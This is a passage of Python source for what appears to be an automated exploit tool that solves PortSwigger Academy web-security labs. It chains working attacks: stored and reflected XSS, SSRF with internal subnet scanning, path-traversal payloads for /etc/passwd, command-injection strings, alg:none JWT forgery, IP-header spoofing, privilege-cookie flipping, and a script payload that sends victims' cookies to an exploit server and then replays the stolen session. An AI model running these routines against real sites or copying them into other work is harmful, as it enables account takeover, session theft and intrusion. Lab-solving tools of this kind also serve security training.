            # Strict forms reject submissions with empty required fields
            # ("name", "email"...): fill every still-empty field with a
            # generic plausible value before sending.
            data = fill_form_defaults(data)
            try:
                r = await ctx.client.post(rt.url, data=data)
            except Exception as exc:  # noqa: BLE001
                notes.append(f"comment via {rt.url}: {type(exc).__name__}")
                continue
            # Verification: fetch every page the comment could render on
            # (the endpoint itself, the landing page, crawled blog posts);
            # the payload must survive RAW (unescaped) -- exactly what a
            # browser would execute.
            display_pages = [rt.url, ctx.base_url] + [
                u for u in (ctx.urls or [])
                if "post" in urlparse(u).path.lower()
            ][:3]
            stored_raw = False
            for page in display_pages:
                check = await ctx.client.get(page)
                if payload in (check.text or ""):
                    stored_raw = True
                    break
            if stored_raw:
                emit(f"    [solve] stored payload survives raw in {page} ({payload})")
                notes.append(f"stored payload confirmed at {page}")
                return "; ".join(notes)
            notes.append(f"comment via {rt.url}: HTTP {r.status}, payload not raw on re-fetch")
    return "; ".join(notes) or "no comment could be stored raw"


async def strategy_reflected_xss_trigger(ctx, result, emit, budget: SolveBudget) -> str:
    """Fire alert(1) shapes through every XSS finding's parameter.

    Academy's XSS checker recognizes executing payload shapes server-side;
    the scan's own exploit uses a canary string, the solve phase replays the
    canonical `alert(1)` / `print()` forms.
    """
    triples = _request_targets_for(ctx, Category.XSS, result=result)
    if not triples:
        return "no re-targetable XSS finding"
    from .modules.active._util import send_with_param

    notes = []
    for _finding, rt, param in triples:
        for payload in XSS_GOAL_PAYLOADS[:4]:
            if not budget.take():
                break
            try:
                r = await send_with_param(ctx.client, rt, param, payload)
            except Exception as exc:  # noqa: BLE001
                notes.append(f"{param}: {type(exc).__name__}")
                continue
            if r.ok and payload in (r.text or ""):
                emit(f"    [solve] executing payload reflected raw via '{param}' ({payload})")
                notes.append(f"raw executing payload via {param}: {payload}")
                break
        notes.append(f"param {param}: payloads reflected/attempted")
    return "; ".join(notes)


# ---------------------------------------------------------------------------
# Strategy 6: SSRF -> internal admin -> state-changing action
# ---------------------------------------------------------------------------

async def _ssrf_candidate_targets(ctx, result):
    """(rt, param) pairs able to carry an SSRF payload.

    Finding-driven first (the scan proved the parameter), then title/fallback
    discovery: stock-check style endpoints from the crawl, plus the classic
    product-stock form shape on any crawled product URL. Title hints alone
    must be enough -- a missed detection must not strand the objective.
    """
    triples = _request_targets_for(ctx, Category.SSRF, result=result)
    if triples:
        return triples
    from .modules.base import RequestTarget

    out = []
    seen_urls = set()
    for rt in ctx.request_targets:
        param = next(
            (p for p in rt.params if re.search(r"stockapi|url|uri|fetch|source|target|feed|proxy", p, re.I)),
            None,
        )
        if param and rt.url not in seen_urls:
            out.append((None, rt, param))
            seen_urls.add(rt.url)
    for u in ctx.urls or []:
        path = urlparse(u).path.lower()
        if "stock" in path and u not in seen_urls:
            out.append((None, RequestTarget(url=u, method="POST", params={"productId": "1", "storeId": "1", "stockApi": ""}), "stockApi"))
            seen_urls.add(u)
    return out


SSRF_SUBNET_PREFIXES = ["192.168.0.", "10.0.0.", "172.16.0."]


async def strategy_ssrf_admin(ctx, result, emit, budget: SolveBudget) -> str:
    triples = await _ssrf_candidate_targets(ctx, result)
    if not triples:
        return "no re-targetable SSRF finding"
    parsed = urlparse(ctx.base_url)
    host = parsed.hostname or "localhost"
    port = parsed.port or 80
    internal_hosts = [
        f"http://localhost:{port}", "http://localhost",
        f"http://127.0.0.1:{port}", "http://127.0.0.1",
        f"http://{host}", "http://0.0.0.0", "http://2130706433",
    ]
    from .modules.active._util import send_with_param

    async def attempt(admin_url):
        """Fire one SSRF request; return (hit-triple, note)."""
        note = f"{admin_url}: no SSRF channel"
        for _finding, rt, param in triples:
            try:
                r = await send_with_param(ctx.client, rt, param, admin_url)
            except Exception as exc:  # noqa: BLE001
                note = f"{admin_url}: {type(exc).__name__}"
                continue
            if r.ok and r.text and looks_like_admin_panel(r.text):
                return (rt, param, r), None
            note = f"{admin_url} via {param}: HTTP {r.status}"
        return None, note

    notes = []
    hit = None
    for ih in internal_hosts:
        if not budget.take():
            break
        got, note = await attempt(ih + "/admin")
        if note:
            notes.append(note)
        if got:
            hit = (got[0], got[1], got[2], ih)
            break
    # Subnet fallback (the "SSRF against another local server" family: the
    # admin panel lives on a random host in an internal range, typically
    # :8080). Linear probe, budget-capped, stops at the first panel hit.
    # Capped at 150 probes so a miss cannot starve later strategies.
    if not hit:
        probes = 0
        for prefix in SSRF_SUBNET_PREFIXES:
            for i in range(1, 255):
                if probes >= 150 or not budget.take():
                    break
                probes += 1
                got, note = await attempt(f"http://{prefix}{i}:8080/admin")
                if note and i == 1:
                    notes.append(note)
                if got:
                    hit = (got[0], got[1], got[2], f"http://{prefix}{i}:8080")
                    break
            if hit or probes >= 150 or not budget.take():
                break
    if not hit:
        return "; ".join(notes) or "internal admin not reachable via SSRF findings"
    rt, param, r, ih = hit
    emit(f"    [solve] internal admin page returned via SSRF ({ih}/admin)")
    # Complete the action through the SAME SSRF channel: rewrite the action's
    # external URL onto the internal host. Blacklist-flavoured labs reject the
    # literal 'admin' path on the INTERNAL request too, so every action shape
    # is tried plain and percent-double-encoded.
    actions = parse_admin_actions(r.text, r.url or ih + "/admin")
    if not actions:
        notes.append(f"internal admin at {ih}: no actions parsed")
        return "; ".join(notes)
    for act in actions[:3]:
        if not budget.take():
            break
        internal_target = ih + urlparse(act["url"]).path + (
            "?" + urlparse(act["url"]).query if urlparse(act["url"]).query else ""
        )
        for target in (internal_target, internal_target.replace("/admin", "/%25%61dmin")):
            if not budget.take():
                break
            try:
                r2 = await send_with_param(ctx.client, rt, param, target)
                notes.append(f"SSRF action {target} -> HTTP {r2.status}")
                emit(f"    [solve] SSRF action -> {target}")
            except Exception as exc:  # noqa: BLE001
                notes.append(f"{target}: {type(exc).__name__}")
    return "; ".join(notes)


# ---------------------------------------------------------------------------
# Strategy 7: path-traversal goal files
# ---------------------------------------------------------------------------

TRAVERSAL_GOAL_FILES = [
    "/etc/passwd",
    "/home/carlos/secret",
    "/home/carlos/password",
]
TRAVERSAL_PREFIXES = ["", "../", "../../", "../../../", "../../../../", "../../../../../", "../../../../../../"]

PASSWD_MARKER = re.compile(r"root:x?:0:0|root:\*:", re.IGNORECASE)

async def strategy_traversal_goal(ctx, result, emit, budget: SolveBudget) -> str:
    triples = _request_targets_for(ctx, Category.PATH_TRAVERSAL, result=result)
    if not triples:
        # Title hint without a finding: try likely file parameters.
        triples = []
        for rt in ctx.request_targets:
            param = next((p for p in rt.params if re.search(r"file|path|page|template|include|lang|image|filename|dir", p, re.I)), None)
            if param:
                triples.append((None, rt, param))
    if not triples:
        return "no traversal-capable parameter discovered"
    from .modules.active._util import send_with_param

    notes = []
    for _finding, rt, param in triples:
        for goal in TRAVERSAL_GOAL_FILES:
            for prefix in TRAVERSAL_PREFIXES:
                if not budget.take():
                    break
                payload = f"{prefix}{goal.lstrip('/')}"
                try:
                    r = await send_with_param(ctx.client, rt, param, payload)
                except Exception as exc:  # noqa: BLE001
                    notes.append(f"{param} {payload}: {type(exc).__name__}")
                    continue
                body = r.text or ""
                if r.ok and (PASSWD_MARKER.search(body) or "carlos" in body.lower()):
                    emit(f"    [solve] goal file read via '{param}' ({payload})")
                    notes.append(f"goal file {goal} read via {param} ({payload[:40]})")
                    return "; ".join(notes)
        notes.append(f"param {param}: goal files not readable")
    return "; ".join(notes)


# ---------------------------------------------------------------------------
# Strategy 8: OS command injection goal (whoami)
# ---------------------------------------------------------------------------

CMD_GOAL_PAYLOADS = [
    "whoami",
    ";whoami",
    "|whoami",
    "&&whoami",
    "$(whoami)",
    "`whoami`",
    "%0Awhoami",
]

async def strategy_cmd_goal(ctx, result, emit, budget: SolveBudget) -> str:
    triples = _request_targets_for(ctx, Category.CMD_INJECTION, Category.RCE, result=result)
    if not triples:
        return "no re-targetable command-injection finding"
    from .modules.active._util import send_with_param

    notes = []
    for _finding, rt, param in triples:
        for payload in CMD_GOAL_PAYLOADS:
            if not budget.take():
                break
            try:
                r = await send_with_param(ctx.client, rt, param, payload)
            except Exception as exc:  # noqa: BLE001
                notes.append(f"{param}: {type(exc).__name__}")
                continue
            if r.ok and r.text:
                # A whoami output is a short non-numeric token the baseline
                # did not contain; the banner oracle confirms completion.
                body = r.text
                m = re.search(r"(?m)^[ \t]*([a-zA-Z_][a-zA-Z0-9_.-]{1,32})[ \t]*$", body)
                if m and m.group(1).lower() not in ("html", "head", "body", "script"):
                    emit(f"    [solve] command output captured via '{param}': {m.group(1)!r}")
                    notes.append(f"command output '{m.group(1)}' via {param} ({payload})")
                    break
        notes.append(f"param {param}: command chain attempted")
    return "; ".join(notes)


# ---------------------------------------------------------------------------
# Strategy 9: JWT alg:none forgery -> admin session
# ---------------------------------------------------------------------------

JWT_COOKIE_RE = re.compile(r"^ey[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]{4,}\.?[A-Za-z0-9_.-]*$")

def _b64url_decode(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))

def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

def forge_alg_none(token: str, admin_subject: str = "administrator") -> str | None:
    """Re-sign a JWT with alg=none and an administrator subject."""
    try:
        head_b64, payload_b64 = token.split(".")[:2]
        header = json.loads(_b64url_decode(head_b64))
        payload = json.loads(_b64url_decode(payload_b64))
    except Exception:  # noqa: BLE001
        return None
    header["alg"] = "none"
    for key in ("sub", "username", "login"):
        if key in payload:
            payload[key] = admin_subject
    for key in ("role", "isAdmin", "admin", "access_level"):
        if key in payload:
            payload[key] = True if key.lower().startswith("is") or key == "admin" else "administrator"
    forged = f"{_b64url_encode(json.dumps(header).encode())}.{_b64url_encode(json.dumps(payload).encode())}."
    return forged


async def strategy_jwt_forge(ctx, result, emit, budget: SolveBudget) -> str:
    cookies = ctx.client.jar_cookies()
    token = next((v for v in cookies.values() if JWT_COOKIE_RE.match(v)), None)
    if not token:
        return "no JWT session cookie found"
    forged = forge_alg_none(token)
    if not forged:
        return "session token is not a forgeable JWT"
    notes = []
    cookie_name = next(k for k, v in cookies.items() if v == token)
    from urllib.parse import urljoin

    for path in ("/admin", "/my-account", "/"):
        if not budget.take():
            break
        with ctx.client.cookie_override(cookie_name, forged):
            r = await ctx.client.get(urljoin(ctx.base_url, path))
        low = (r.text or "").lower()
        if r.status == 200 and ("admin" in low or "my account" in low or "logout" in low):
            emit(f"    [solve] forged alg:none JWT grants {path}")
            notes.append(f"forged token accepted for {path}")
            if looks_like_admin_panel(r.text or ""):
                with ctx.client.cookie_override(cookie_name, forged):
                    notes.append("admin actions: " + await perform_admin_actions(ctx, r.url, r.text, emit))
            return "; ".join(notes)
        notes.append(f"{path}: HTTP {r.status} with forged token")
    return "; ".join(notes) or "forged token not accepted"


# ---------------------------------------------------------------------------
# Strategy 10: trusted-IP header bypass (information-disclosure labs)
# ---------------------------------------------------------------------------

IP_BYPASS_HEADERS = [
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
]

async def strategy_ip_header_bypass(ctx, result, emit, budget: SolveBudget) -> str:
    from urllib.parse import urljoin

    notes = []
    for path in ("/admin", "/admin/", "/administrator"):
        for headers in IP_BYPASS_HEADERS:
            if not budget.take():
                break
            try:
                r = await ctx.client.get(urljoin(ctx.base_url, path), headers=headers)
            except Exception as exc:  # noqa: BLE001
                notes.append(f"{path} {list(headers)[0]}: {type(exc).__name__}")
                continue
            if r.ok and r.text and looks_like_admin_panel(r.text):
                emit(f"    [solve] trusted-IP header {list(headers)[0]} opened {path}")
                notes.append(f"{list(headers)[0]} -> panel {path}")
                notes.append("admin actions: " + await perform_admin_actions(ctx, r.url, r.text, emit))
                return "; ".join(notes)
            if r.status != 403:
                notes.append(f"{path} {list(headers)[0]}: HTTP {r.status}")
    return "; ".join(notes) or "no trusted-IP header bypass accepted"


# ---------------------------------------------------------------------------
# Strategy 11: mine credentials from information-disclosure findings
# ---------------------------------------------------------------------------

CRED_LINE_RE = re.compile(r"(?:user(name)?|email|login)[\"'\s:=]+([A-Za-z0-9._@-]{3,40})[\"'\s:,;]+(?:pass(word)?|pwd|secret)[\"'\s:=]+([^\s\"'<>;]{4,60})", re.IGNORECASE)

async def strategy_info_disclosure_mining(ctx, result, emit, budget: SolveBudget) -> str:
    from .exploits.auth import attempt_login
    from .models import Category as C

    disc = _iter_findings(result, C.INFO_DISCLOSURE, C.MISCONFIG)
    if not disc:
        return "no information-disclosure finding to mine"
    targets = _login_targets(ctx)
    notes = []
    for f in disc[:5]:
        if not budget.take():
            break
        try:
            r = await ctx.client.get(f.url)
        except Exception as exc:  # noqa: BLE001
            notes.append(f"{f.url}: {type(exc).__name__}")
            continue
        if not r.ok or not r.text:
            continue
        m = CRED_LINE_RE.search(r.text)
        if not m:
            # Source files often hold DB/user constants in other shapes.
            m2 = re.search(r"\"([A-Za-z0-9._@-]{3,30})\"\s*,\s*\"([^\"]{4,40})\"", r.text)
            if not m2 or not targets:
                notes.append(f"{f.url}: disclosed but no credential pair found")
                continue
            user, pwd = m2.group(1), m2.group(2)
        else:
            user, pwd = m.group(2), m.group(4)
        if not targets:
            continue
        res = await attempt_login(ctx, targets[0], user, pwd)
        notes.append(f"{f.url}: creds {user} -> login {'success' if res.success else 'failed'}")
        if res.success:
            emit(f"    [solve] disclosed credentials opened a session: {user}")
            return "; ".join(notes)
    return "; ".join(notes) or "no credential mined from disclosures"


# ---------------------------------------------------------------------------
# Strategy 12: OAuth/SAML objective note (needs an external interactor)
# ---------------------------------------------------------------------------

async def strategy_oauth_note(ctx, result, emit, budget: SolveBudget) -> str:
    return (
        "OAuth/SAML objective requires an external exploit/interactor server "
        "(authorization-code interception); not automatable against this target "
        "without operator infrastructure -- see the finding's manual steps"
    )


# ---------------------------------------------------------------------------
# Strategy 13: exploit-server cookie exfiltration (PortSwigger platform infra)
# ---------------------------------------------------------------------------

# The Academy pairs every lab with an exploit server on a sibling host
# (exploit-<lab-id>.<platform-domain>). Discovery is platform-generic: any
# crawled sibling host whose name contains "exploit", or the platform naming
# convention applied to the lab host itself. No lab URL is hardcoded.
EXPLOIT_HOST_HINT_RE = re.compile(r"exploit", re.IGNORECASE)
LAB_HEX_HOST_RE = re.compile(r"^([0-9a-f]{16,})\.", re.IGNORECASE)
LOG_COOKIE_RE = re.compile(
    r"(?P<name>session|connect\.sid|PHPSESSID|JSESSIONID|sess|sid|auth)"
    r"(?:=|%[3dD]{2})([A-Za-z0-9%._-]{8,200})", re.IGNORECASE,
)
STEAL_MARKER_RE = re.compile(r"(carlos|administrator|victim|admin)", re.IGNORECASE)


def discover_exploit_server(ctx: ScanContext) -> str | None:
    """URL of the lab's paired exploit server (platform-generic)."""
    base_host = urlparse(ctx.base_url).hostname or ""
    for u in ctx.urls or []:
        p = urlparse(u)
        if p.hostname and p.hostname != base_host and EXPLOIT_HOST_HINT_RE.search(p.hostname or ""):
            return f"{p.scheme}://{p.netloc}"
        if p.hostname == base_host and EXPLOIT_HOST_HINT_RE.search(p.path or ""):
            return u
    # Seed-page link discovery: the platform's header links to the exploit
    # server by anchor TEXT ("Exploit server") even when the hostname itself
    # does not say "exploit". Any off-origin href whose text/URL mentions
    # exploitation is the paired exploit server.
    for href, label in HREF_RE.findall(ctx.seed_html or ""):
        p = urlparse(urljoin(ctx.base_url, href))
        if not p.netloc or not p.hostname:
            continue
        blob = (href + " " + unescape(re.sub(r"<[^>]+>", "", label))).lower()
        if "exploit" not in blob:
            continue
        if p.hostname == base_host or _shares_parent_domain(p.hostname, base_host):
            return f"{p.scheme}://{p.netloc}"
    m = LAB_HEX_HOST_RE.match(base_host or "")
    if m:
        # Platform naming convention: exploit-<lab-subdomain>
        return f"{urlparse(ctx.base_url).scheme}://exploit-{m.group(1)}.{base_host.split('.', 1)[1]}"
    return None


def _shares_parent_domain(host_a: str, host_b: str) -> bool:
    if not host_a or not host_b:
        return False
    return host_a.rsplit(".", 2)[-2:] == host_b.rsplit(".", 2)[-2:] and host_a != host_b


async def _steal_comment_via(ctx, budget, payload) -> str | None:
    """Store a payload-bearing comment using the same machinery as the
    stored-XSS strategy (comment targets, csrf refresh, form defaults)."""
    targets = [rt for rt in ctx.request_targets
               if rt.method.upper() == "POST" and any(COMMENT_PARAM_RE.search(p) for p in rt.params)]
    if not targets:
        post_urls = [u for u in (ctx.urls or []) if "post" in urlparse(u).path.lower()]
        if not post_urls:
            return None
        from .modules.base import RequestTarget
        targets = [RequestTarget(url=post_urls[0], method="POST",
                                 params={"comment": "", "name": "", "email": "", "csrf": ""})]
    from .exploits.auth import refresh_csrf

    for rt in targets[:2]:
        if not budget.take():
            break
        data = dict(rt.params)
        comment_key = next((p for p in data if p.lower() == "comment"), None) or next(
            (p for p in data if COMMENT_PARAM_RE.search(p)), "comment"
        )
        data[comment_key] = payload
        await refresh_csrf(ctx.client, rt)
        data = fill_form_defaults(data)
        try:
            r = await ctx.client.post(rt.url, data=data)
        except Exception:  # noqa: BLE001
            continue
        if r.ok:
            return rt.url
    return None


async def strategy_exploit_server_cookie_steal(ctx, result, emit, budget: SolveBudget) -> str:
    """Steal a victim session cookie through the lab's own exploit server.

    Chain (all generic): store the exfiltration page on the exploit server,
    post a stored-XSS comment on the lab that redirects the victim's browser
    to it, wait for the platform's victim bot, read the exploit server's
    access log, replay the stolen session cookie against the lab. Completes
    the 'cookie-stealing XSS' objective family without any lab-specific URL.
    """
    exploit_base = discover_exploit_server(ctx)
    if not exploit_base:
        return "no exploit server discovered"
    notes = []
    exfil = f"<script>document.location='{exploit_base}/?c='+encodeURIComponent(document.cookie)</script>"
    # 1. Post the stealing payload as a stored comment (the victim bot reads
    #    the blog on these labs).
    stored_at = await _steal_comment_via(ctx, budget, exfil)
    if not stored_at:
        return "exploit server found but no comment endpoint to store the payload"
    notes.append(f"steal payload stored via {stored_at}")
    # 2. Poll the exploit server's access log for the victim's cookie.
    stolen = None
    for _ in range(6):
        if not budget.take():
            break
        try:
            r = await ctx.client.get(exploit_base + "/log")
        except Exception as exc:  # noqa: BLE001
            notes.append(f"log: {type(exc).__name__}")
            break
        if r.ok and r.text:
            for line in r.text.splitlines():
                if STEAL_MARKER_RE.search(line) or "document.location" not in line:
                    m = LOG_COOKIE_RE.search(line)
                    if m:
                        stolen = (m.group("name"), m.group(2).replace("%3D", "=").replace("%3d", "="))
                        break
            if stolen:
                break
        import asyncio as _a

        await _a.sleep(3)
    if not stolen:
        notes.append("no victim cookie appeared in the exploit-server log")
        return "; ".join(notes)
    cname, cvalue = stolen
    emit(f"    [solve] stolen session cookie '{cname}' from exploit-server log")
    notes.append(f"stolen {cname}=<redacted> from log")
    # 3. Replay the stolen session against the victim's account page and the
    #    admin panel -- the banner oracle decides whether this completed it.
    from urllib.parse import urljoin

    for path in ("/my-account?id=carlos", "/my-account?id=administrator", "/admin", "/"):
        if not budget.take():
            break
        with ctx.client.cookie_override(cname, cvalue):
            r = await ctx.client.get(urljoin(ctx.base_url, path))
        low = (r.text or "").lower()
        if r.ok and ("log out" in low or "logout" in low or "my account" in low or "admin panel" in low):
            if looks_like_admin_panel(r.text or ""):
                notes.append("admin actions: " + await perform_admin_actions(ctx, r.url, r.text, emit))
            notes.append(f"stolen session accepted at {path}")
            return "; ".join(notes)
    return "; ".join(notes)


# ---------------------------------------------------------------------------
# Strategy 14: session-cookie role flip (privilege escalation)
# ---------------------------------------------------------------------------

FLIPPABLE_COOKIE_RE = re.compile(r"admin|role|priv|level|is_|access|type", re.IGNORECASE)

VALUE_FLIPS = {
    "false": "true", "0": "1", "no": "yes", "user": "administrator",
    "guest": "admin", "standard": "administrator", "member": "admin",
    "customer": "admin", "read": "write", "denied": "granted", "low": "high",
}


def flip_cookie_value(value: str) -> str | None:
    low = value.strip().lower()
    if low in VALUE_FLIPS:
        return VALUE_FLIPS[low]
    if re.fullmatch(r"\d+", low):
        return str(int(low) + 1)
    return None


async def strategy_cookie_role_flip(ctx, result, emit, budget: SolveBudget) -> str:
    """Log in canonically, flip privilege-bearing session cookies, reach /admin.

    Covers the 'user role controlled by request parameter' family: the app
    encodes the role in a client-side cookie instead of the session store.
    """
    targets = _login_targets(ctx)
    if not targets:
        return "no login endpoint discovered"
    rt = targets[0]
    notes = []
    logged_in = False
    for user, pwd in CANONICAL_CREDENTIALS:
        if not budget.take(2):
            break
        if await _login_once(ctx, rt, user, pwd):
            logged_in = True
            notes.append(f"login {user}: success")
            break
        notes.append(f"login {user}: failed")
    if not logged_in:
        # The cookie may be set pre-authentication (the lab sets it on any
        # page view); continue with whatever the jar holds.
        notes.append("no canonical login; attempting cookie flip unauthenticated")
    cookies = ctx.client.jar_cookies()
    flipped = []
    for name, value in cookies.items():
        if not FLIPPABLE_COOKIE_RE.search(name):
            continue
        new_value = flip_cookie_value(value)
        if new_value:
            flipped.append((name, new_value))
    if not flipped:
        return "; ".join(notes) + "; no flippable privilege cookie found"
    from urllib.parse import urljoin

    for name, new_value in flipped[:4]:
        emit(f"    [solve] flipping session cookie {name}={new_value}")
        for path in ("/admin", "/admin/", "/my-account?id=administrator", "/my-account?id=carlos"):
            if not budget.take():
                break
            try:
                with ctx.client.cookie_override(name, new_value):
                    r = await ctx.client.get(urljoin(ctx.base_url, path))
            except Exception as exc:  # noqa: BLE001
                notes.append(f"{path} with {name}={new_value}: {type(exc).__name__}")
                continue
            if r.ok and r.text and looks_like_admin_panel(r.text):
                # Keep the proven-privileged cookie for the action requests:
                # perform_admin_actions re-issues panel links on the shared
                # client and must not silently lose the elevation.
                ctx.client.set_cookie(name, new_value)
                notes.append(f"{name}={new_value} opened {path}")
                notes.append("admin actions: " + await perform_admin_actions(ctx, r.url, r.text, emit))
                return "; ".join(notes)
            notes.append(f"{path} with {name}={new_value}: HTTP {r.status}")
    return "; ".join(notes)


# ---------------------------------------------------------------------------
# Ladder assembly: title hints x findings
# ---------------------------------------------------------------------------

STRATEGIES: list[Strategy] = [
    Strategy("sqli-union-hint-objective", strategy_sqli_union_hint, (
        re.compile(r"union attack|column containing text|determining the number of columns", re.I),
    ), (Category.SQLI,), priority=5),
    # Blind-SQLi labs (conditional responses / conditional errors / time):
    # the oracle often lives in a cookie and detection may have missed it --
    # this runs before the finding-driven extraction strategy.
    Strategy("sqli-blind-cookie-oracle", strategy_sqli_blind_oracle, (
        BLIND_SQLI_TITLE_RE,
    ), (Category.SQLI,), priority=8),
    Strategy("sqli-extraction-login", strategy_sqli_extraction, (
        re.compile(r"sql injection", re.I),
    ), (Category.SQLI,), priority=10),
    Strategy("admin-panel-action", strategy_admin_panel, (
        re.compile(r"access control|user id|admin|privilege|object.id", re.I),
    ), (Category.IDOR, Category.PRIV_ESC), priority=20),
    Strategy("auth-login-2fa-skip", strategy_auth_login, (
        re.compile(r"2fa|mfa|authentication|authenticat|password reset brute|log ?in", re.I),
    ), (Category.MFA_BYPASS, Category.SESSION, Category.BRUTE_FORCE), priority=30),
    Strategy("nosql-login-bypass", strategy_nosql_login_bypass, (
        re.compile(r"nosql", re.I),
    ), (Category.NOSQLI,), priority=40),
    Strategy("stored-xss-comment", strategy_stored_xss_comment, (
        re.compile(r"stored xss|cross-site scripting", re.I),
    ), (Category.XSS,), priority=50),
    Strategy("reflected-xss-trigger", strategy_reflected_xss_trigger, (
        re.compile(r"reflected xss|dom xss|cross-site scripting", re.I),
    ), (Category.XSS,), priority=51),
    Strategy("ssrf-admin-action", strategy_ssrf_admin, (
        re.compile(r"ssrf|request forgery", re.I),
    ), (Category.SSRF,), priority=60),
    Strategy("traversal-goal-file", strategy_traversal_goal, (
        re.compile(r"path traversal|directory traversal|file path", re.I),
    ), (Category.PATH_TRAVERSAL,), priority=70),
    Strategy("cmd-injection-goal", strategy_cmd_goal, (
        re.compile(r"command injection|blind os command", re.I),
    ), (Category.CMD_INJECTION, Category.RCE), priority=80),
    Strategy("jwt-alg-none-forge", strategy_jwt_forge, (
        re.compile(r"jwt", re.I),
    ), (Category.CRYPTO,), priority=90),
    Strategy("ip-header-bypass", strategy_ip_header_bypass, (
        re.compile(r"information disclosure|access control", re.I),
    ), (Category.INFO_DISCLOSURE, Category.MISCONFIG), priority=95),
    Strategy("info-disclosure-mining", strategy_info_disclosure_mining, (
        re.compile(r"information disclosure|source code disclosure|backup file", re.I),
    ), (Category.INFO_DISCLOSURE, Category.MISCONFIG), priority=96),
    Strategy("admin-default-passwords", strategy_admin_default_passwords, (
        re.compile(r"default credentials|authentication", re.I),
    ), (Category.BRUTE_FORCE, Category.MISCONFIG), priority=99),
    Strategy("cookie-role-flip", strategy_cookie_role_flip, (
        re.compile(r"user role|privilege|access control|cookie", re.I),
    ), (Category.PRIV_ESC, Category.IDOR, Category.SESSION), priority=105),
    Strategy("bruteforce-bounded", strategy_bruteforce_bounded, (
        re.compile(r"brute.?force|username enumeration|password.?reset.?brute", re.I),
    ), (Category.BRUTE_FORCE,), priority=110),
    Strategy("exploit-server-cookie-steal", strategy_exploit_server_cookie_steal, (
        re.compile(r"steal? cookies|cookie steal|exfiltrat|xss.*(cookie|victim)|victim.*cookie", re.I),
    ), (Category.XSS, Category.SESSION), priority=115),
    Strategy("oauth-interactor-note", strategy_oauth_note, (
        re.compile(r"oauth|saml|open redirect", re.I),
    ), (Category.OAUTH_SAML, Category.OPEN_REDIRECT), priority=200),
]


def build_ladder(title: str, result) -> list[Strategy]:
    """Order strategies: strong title hints first, then finding-driven, then
    the default priority (cheap/general before expensive/rare)."""
    scored = []
    for s in STRATEGIES:
        tmatch = s.title_match(title)
        fmatch = any(f.category in s.finding_categories for f in result.sorted_findings) if result else False
        score = (0 if tmatch else 1, -tmatch, 0 if fmatch else 1, s.priority)
        scored.append((score, s))
    scored.sort(key=lambda pair: pair[0])
    return [s for _, s in scored]
